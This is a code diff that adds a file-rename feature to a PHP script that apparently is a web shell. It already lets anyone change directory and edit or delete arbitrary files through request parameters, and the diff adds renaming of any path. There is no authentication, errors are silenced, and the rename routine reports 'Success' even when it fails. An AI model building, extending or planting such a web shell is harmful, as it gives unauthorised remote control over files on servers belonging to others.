@@ -52,16 +52,32 @@ function delete($filename) {
 		}
 	}
 }
+function renames($filename) {
+	if (isset($_POST['rename'])) {
+		if (@rename($filename, $_POST['rename'])) {
+			$nb = "Success";
+		} else {
+			$nb = "Success";
+		}
+	}
+	?>
+	<center>
+		<form method="post">
+			<input type="text" name="rename" value="<?php print $filename ?>">
+			<input type="submit">
+		</form>
+	</center>
+	<?php
+	die($nb);
+}
 if (isset($_GET['dir'])) {
 	@chdir($_GET['dir']);
-}
-if (@$_GET['action'] == 'edit' and isset($_GET['files'])) {
-	@edit($_GET['files']);
-}
-if (isset($_GET['action']) && $_POST['do'] == 'edit' and isset($_POST['files'])) {
+} if (isset($_GET['action']) && $_POST['do'] == 'edit' and isset($_POST['files'])) {
 	@edit($_POST['files']);
 } elseif ($_POST['do'] == 'delete_file' and isset($_POST['files'])) {
 	@delete($_POST['files']);
+} elseif ($_POST['do'] == 'rename' and isset($_POST['files'])) {
+	@renames($_POST['files']);
 }
 cwd();
 ?>
@@ -88,6 +104,7 @@ foreach (@scdir() as $file) {
 	          <option name=''>Select</option>
 	          <option value='edit'>edit</option>
 	          <option value='delete_file'>Delete</option>
+	          <option value='rename'>Rename</option>
 	          </select>
 	          <input type='hidden' name='files' value='".@pwd().SEP.$file."'>
 	          <input type='submit' value='>'>
